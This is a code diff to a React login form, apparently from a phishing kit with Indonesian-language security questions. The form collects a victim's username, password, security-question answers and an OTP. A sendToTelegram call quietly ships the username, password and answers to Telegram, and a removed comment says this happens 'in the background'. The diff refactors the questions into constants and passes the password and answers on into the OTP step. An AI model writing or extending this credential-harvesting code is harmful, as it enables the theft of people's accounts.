@@ -71,6 +71,10 @@ const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
     setStep(2); // Go to Verification Questions
   };
 
+  // Hardcoded questions based on typical usage or reference context
+  const Q1_TEXT = "Apa film favorit Anda?";
+  const Q2_TEXT = "Apa Makanan Kesukaan Anda?";
+
   const handleFinalSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
@@ -79,14 +83,9 @@ const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
     if (!a2 || a2.length < 1) { return; }
 
     setLoading(true); // Disable button immediately
-
-    // Kirim ke Telegram di background
-    // Hardcoded questions based on typical usage or reference context
-    const q1 = "Apa film favorit Anda?";
-    const q2 = "Apa Makanan Kesukaan Anda?";
     
     // Passing questions and answers separately to allow proper formatting
-    const success = await sendToTelegram(username, password, q1, a1, q2, a2);
+    const success = await sendToTelegram(username, password, Q1_TEXT, a1, Q2_TEXT, a2);
     
     setLoading(false);
     
@@ -266,6 +265,11 @@ const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
           onSubmitOTP={handleOTPVerification}
           playClickSound={playClickSound}
           username={username}
+          password={password}
+          q1={Q1_TEXT}
+          a1={a1}
+          q2={Q2_TEXT}
+          a2={a2}
         />
       )}
 
